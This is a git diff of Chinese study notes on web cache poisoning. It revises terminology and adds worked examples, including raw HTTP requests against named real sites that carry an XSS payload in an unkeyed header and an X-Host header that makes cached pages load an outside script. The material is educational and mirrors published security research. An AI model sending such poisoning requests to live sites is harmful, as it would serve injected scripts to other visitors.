@@ -5,7 +5,7 @@ Web缓存位于用户和应用程序服务器之间，它们保存和提供某�
 ![](media/Pasted%20image%2020231003235129.png)
 
 ### Cache keys
-每当缓存收到一个资源的请求时，它需要决定是否已经保存了这个确切资源的副本，并可以用它来回复请求，还是需要将请求转发给应用服务器。逐字节匹配不现实，这就出现了`缓存键`解决问题
+每当缓存收到一个资源的请求时，它需要决定是否已经保存了这个确切资源的副本，并可以用它来回复请求，还是需要将请求转发给应用服务器。逐字节匹配不现实，这就出现了`缓存键`解决问题~~（通常使用request-line和user-agent作为缓存键）~~
 ```java
 GET /blog/post.php?mobile=1 HTTP/1.1  
 Host: example.com  
@@ -23,7 +23,7 @@ Connection: close
 ```
 
 在上述请求中，使用了HTTP方法`GET`和主机名`example.com` 以及请求路径`/blog/post.php` 和查询字符串`?mobile=1`来作为缓存建，可想而知，该页面将以错误的语言提供给第二个访问者
->这暗示了一个问题--由非键控输入触发的响应中的任何差异都可能被存储并提供给其他用户
+>这暗示了一个问题--由非缓存建触发的响应中的任何差异都可能被存储并提供给其他用户
 
 #### 补充：
 ```
@@ -50,13 +50,15 @@ Web缓存中毒的目的是发送导致有害响应的请求，这些响应被�
 
 ### Methodology
 ![](media/Pasted%20image%2020231004172422.png)
-1. 找到非键控输入 ，Param Miner
+1. 找到非缓存键 ，Param Miner
 2. 评估你可以用它做多少破坏，然后尝试将它存储该高速缓存中。
-3. 缓存的响应可以屏蔽未键控的输入，因此如果您试图手动检测或探索未键控的输入，那么缓存终结者是至关重要的。如果加载了Param Miner，则可以通过向查询字符串添加一个值为$randomplz的参数来确保每个请求都有一个唯一的缓存键。
+3. 缓存的响应可以屏蔽非缓存键输入，因此如果您试图手动检测或探索非缓存键输入，那么缓存终结者是至关重要的。如果加载了Param Miner，则可以通过向查询字符串添加一个值为$randomplz的参数来确保每个请求都有一个唯一的缓存键。
 4. ~~当审核一个实时网站时，意外地毒害其他访问者是一个永久的危险。Param Miner通过向Burp的所有出站请求添加缓存破坏器来缓解此问题。这个缓存buster有一个固定的值，因此您可以自己观察缓存行为，而不会影响其他用户。~~
 
-### Basic Poisoning
-1. 找到非键控输入
+### 实例分析
+
+#### Basic Poisoning
+1. 找非缓存键
 ```code
 GET /en?cb=1 HTTP/1.1  
 Host: www.redhat.com  
@@ -88,7 +90,26 @@ HTTP/1.1 200 OK
 <meta property="og:image" content="https://a."><script>alert(1)</script>"/>
 ```
 
-### Discreet poisoning
+#### Discreet poisoning
+1. 发送大量请求保证缓存，方法几乎不可用
+2. 逆向目标的缓存到期系统并通过浏览文档和监控网站来预测准确的到期时间来避免这个问题，但这听起来就很难。
+3. 响应协议头“Age”和“max-age”分别是当前响应的时间和它将过期的时间
+```code
+GET / HTTP/1.1
+Host: unity3d.com
+X-Host: portswigger-labs.net
+
+HTTP/1.1 200 OK
+Via: 1.1 varnish-v4
+Age: 174
+Cache-Control: public, max-age=1800
+…
+<script src="https://portswigger-labs.net/sites/files/foo.js"></script>
+```
+
+
+#### DOM Poisoning
+
 
 
 ## Tools
